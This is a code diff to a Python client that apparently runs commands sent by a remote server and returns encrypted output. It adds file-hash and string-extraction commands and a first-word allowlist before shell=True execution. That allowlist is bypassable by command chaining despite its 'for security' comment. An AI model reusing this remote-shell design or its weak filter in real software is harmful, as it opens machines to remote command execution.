@@ -27,16 +27,52 @@ ENCRYPTION_KEY = Fernet.generate_key()  # Save this securely
 cipher = Fernet(ENCRYPTION_KEY)
 
 BUFFER_SIZE = 4096
-ALLOWED_COMMANDS = {'ls', 'pwd', 'cd', 'upload', 'download', 'clear', 'quit', 'help'}
+ALLOWED_COMMANDS = {'ls', 'pwd', 'cd', 'upload', 'download', 'clear', 'quit', 'help', 'analyze_strings', 'get_file_hash'}
 command_history = []
 
-def hash_file(filepath):
-    """Generate SHA256 hash of a file."""
-    hasher = hashlib.sha256()
-    with open(filepath, 'rb') as f:
-        while chunk := f.read(8192):
-            hasher.update(chunk)
-    return hasher.hexdigest()
+def get_file_hash(filepath, hashtype='sha256'):
+    """Generate hash of a file (md5, sha1, sha256)."""
+    hasher = None
+    if hashtype == 'md5':
+        hasher = hashlib.md5()
+    elif hashtype == 'sha1':
+        hasher = hashlib.sha1()
+    elif hashtype == 'sha256':
+        hasher = hashlib.sha256()
+    else:
+        return "Unsupported hash type. Use md5, sha1, or sha256."
+
+    try:
+        with open(filepath, 'rb') as f:
+            while chunk := f.read(8192):
+                hasher.update(chunk)
+        return hasher.hexdigest()
+    except FileNotFoundError:
+        return f"Error: File not found at {filepath}"
+    except Exception as e:
+        return f"Error hashing file: {e}"
+
+def extract_strings(filepath, min_len=4):
+    """Extract printable strings from a file."""
+    strings = []
+    try:
+        with open(filepath, "rb") as f:
+            data = f.read()
+        current_string = ""
+        for byte in data:
+            if 32 <= byte <= 126:  # Printable ASCII characters
+                current_string += chr(byte)
+            else:
+                if len(current_string) >= min_len:
+                    strings.append(current_string)
+                current_string = ""
+        if len(current_string) >= min_len: # Check for remaining string at EOF
+            strings.append(current_string)
+        return strings if strings else "No printable strings found."
+    except FileNotFoundError:
+        return f"Error: File not found at {filepath}"
+    except Exception as e:
+        return f"Error extracting strings: {e}"
 
 def reliable_send(data):
     """Send encrypted data to the server."""
@@ -119,6 +155,23 @@ def execute_command(command):
     elif command.startswith("download "):
         download_file(command[9:])
         return
+    elif command.startswith("analyze_strings "):
+        filepath = command[16:].strip()
+        strings_result = extract_strings(filepath)
+        if isinstance(strings_result, list):
+            reliable_send("\n".join(strings_result))
+        else:
+            reliable_send(strings_result) # Send error message
+        add_to_history(command)
+        return
+    elif command.startswith("get_file_hash "):
+        parts = command.split()
+        filepath = parts[1]
+        hashtype = parts[2] if len(parts) > 2 else 'sha256'
+        hash_result = get_file_hash(filepath, hashtype)
+        reliable_send(hash_result)
+        add_to_history(command)
+        return
     elif command == "history":
         response = list_history()
         reliable_send("\n".join(response))
@@ -128,7 +181,16 @@ def execute_command(command):
         return
     else:
         try:
-            output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
+            # Ensure only allowed commands are executed via subprocess for security
+            if command.split()[0] in ALLOWED_COMMANDS and command.split()[0] not in ['cd', 'upload', 'download', 'analyze_strings', 'get_file_hash', 'history', 'clear_history', 'help', 'quit']:
+                 output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=True)
+            elif command.split()[0] not in ALLOWED_COMMANDS:
+                 output = f"Command '{command.split()[0]}' is not an allowed command.".encode()
+            else: # Command is handled by other functions or is not a subprocess command
+                # This case should ideally not be reached if all commands are handled above
+                output = f"Command '{command}' handled elsewhere or invalid.".encode()
+                reliable_send(output.decode())
+                return
             reliable_send(output.decode())
             add_to_history(command)
             logging.info(f"Executed command: {command}")
@@ -162,6 +224,8 @@ def display_help():
     cd [directory]: Change directory
     upload [file]: Upload a file to the server
     download [file]: Download a file from the server
+    analyze_strings [filepath]: Extract printable strings from a file
+    get_file_hash [filepath] [md5|sha1|sha256]: Get hash of a file (default sha256)
     clear: Clear the shell
     quit: Exit the shell
     help: Display this help information
